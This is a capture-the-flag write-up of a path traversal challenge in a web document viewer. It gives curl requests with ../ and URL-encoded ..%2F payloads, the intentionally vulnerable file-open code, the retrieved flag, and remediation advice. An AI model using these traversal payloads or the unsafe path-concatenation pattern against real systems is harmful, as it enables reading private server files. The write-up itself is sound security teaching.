dotdotslashflagtxt — Path Traversal Writeup

CTF: boroCTF 2026
Challenge: dotdotslashflagtxt
Category: Web
Points: 100

Description

A company left their internal document viewer exposed. It only shows approved files... or does it?

The challenge provides a simple document viewer exposing several text files:

readme.txt
notes.txt
about.txt
Initial Reconnaissance

Opening the application reveals links such as:

/view?file=readme.txt
/view?file=notes.txt
/view?file=about.txt

The parameter:

file=

immediately becomes the primary attack surface.

Source code inspection confirms the application dynamically loads files based on user input:

<a href="/view?file=readme.txt">readme.txt</a>
<a href="/view?file=notes.txt">notes.txt</a>
<a href="/view?file=about.txt">about.txt</a>

This strongly suggests a potential file inclusion or path traversal vulnerability.

Vulnerability

The application appears to concatenate user input directly into a filesystem path.

A vulnerable implementation would look similar to:

filename = request.args.get("file")
return open("documents/" + filename).read()

If path traversal sequences are not filtered, an attacker can escape the intended directory using:

../
Exploitation
Attempt 1 — Direct Flag Access
curl -s "$BASE/view?file=flag.txt"

Response:

File not found

The flag is not inside the allowed documents directory.

Attempt 2 — Path Traversal
curl -s "$BASE/view?file=../flag.txt"

Response:

boroCTF{p@th_Tr@v3rs@L_r0Ck5!}

Success.

The traversal sequence:

../

moves one directory up, allowing access to files outside the intended document folder.

Additional Testing

Further traversal attempts:

curl -s "$BASE/view?file=../../flag.txt"
curl -s "$BASE/view?file=../../../flag.txt"

returned:

File not found

This indicated that the flag was located exactly one directory above the documents folder.

URL Encoded Variant

The same attack also works using URL encoding:

curl -s "$BASE/view?file=..%2Fflag.txt"

where:

%2F = /

Result:

boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
Attack Flow
User Input
     ↓
/view?file=readme.txt
     ↓
Server Reads File

Modified Input
     ↓
/view?file=../flag.txt
     ↓
Escape Documents Directory
     ↓
Read Sensitive File
     ↓
Flag Retrieved
Flag
boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
Root Cause

The application trusted user-controlled file paths without validation.

Vulnerable logic:

open("documents/" + filename)

User input:

../flag.txt

Resulting path:

documents/../flag.txt

which resolves to:

flag.txt

outside the intended directory.

Remediation
Validate User Input

Reject traversal sequences:

if ".." in filename:
    return "Invalid file"
Use an Allowlist
ALLOWED = {
    "readme.txt",
    "notes.txt",
    "about.txt"
}
Resolve Canonical Paths
import os

path = os.path.realpath(
    os.path.join("documents", filename)
)

if not path.startswith(
    os.path.realpath("documents")
):
    raise Exception("Traversal blocked")
Lessons Learned
Always inspect URL parameters.
File viewers frequently suffer from path traversal bugs.
The sequence ../ should be one of the first tests during web enumeration.
URL encoding can sometimes bypass weak filters.
Never trust user-controlled filesystem paths.
Tools Used
Browser
curl
Manual testing
Takeaway

This challenge demonstrates a classic Directory Traversal (Path Traversal) vulnerability. By replacing an approved filename with ../flag.txt, it was possible to escape the intended documents directory and read arbitrary files from the server, ultimately revealing the flag.
